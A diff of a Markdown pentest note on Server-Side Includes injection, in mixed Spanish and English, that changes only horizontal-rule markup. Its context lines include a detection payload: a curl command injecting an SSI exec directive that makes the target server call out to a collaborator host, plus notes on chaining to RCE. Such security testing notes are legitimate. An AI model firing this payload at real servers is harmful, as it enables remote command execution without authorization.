@@ -27,7 +27,7 @@ linked:
 ---
 # Server-Side Includes (SSI) Injection
 
-***
+---
 
 ## Cheatsheet
 
@@ -102,7 +102,7 @@ tab: **Manual curl / Custom Scripts**
 ![[SSI - Tooling#^ssi-tool-curl]]
 ````
 
-___
+---
 
 ## Overview
 
@@ -137,7 +137,7 @@ OWASP Testing Guide — OTG-INPVAL-009. Vector legacy pero aún encontrado en st
 | Vector | Reflected input en .shtml | Reflected input en template | Path traversal |
 | Common impact | RCE / LFI | RCE | File disclosure / RCE |
 
-___
+---
 
 ## Workflow de explotación
 
@@ -174,7 +174,7 @@ ___
    - Stored SSI (persistent)
 ```
 
-___
+---
 
 ## Detección rápida
 
@@ -225,7 +225,7 @@ curl --data-urlencode "q=<!--#exec cmd=\"curl http://$COLLAB/\" -->" \
      'https://target/search.shtml'
 ```
 
-___
+---
 
 ## Impacto
 
@@ -240,7 +240,7 @@ ___
 - **Combine con file upload** — upload .shtml + trigger.
 - **Combine con LFI** — chain to RCE via SSI exec.
 
-___
+---
 
 ## Mitigación (defender)
 
@@ -274,7 +274,7 @@ ___
 - **File upload validation** — reject `.shtml` uploads.
 - **Audit logs** — monitor for SSI directive patterns.
 
-___
+---
 
 ## Para entender SSI Injection
 
@@ -306,7 +306,7 @@ SSI = legacy webserver directives ejecutados by mod_include. Resulting RCE en we
 
 Both están conceptually similar (template injection → RCE) pero distinct mechanisms y stacks.
 
-___
+---
 
 ## Recursos
 
@@ -319,4 +319,4 @@ ___
 - [Apache HOWTO mod_include](https://httpd.apache.org/docs/current/howto/ssi.html) — beginner guide.
 - [CWE-97 - Improper Neutralization of SSI](https://cwe.mitre.org/data/definitions/97.html) — MITRE.
 
-***
+---
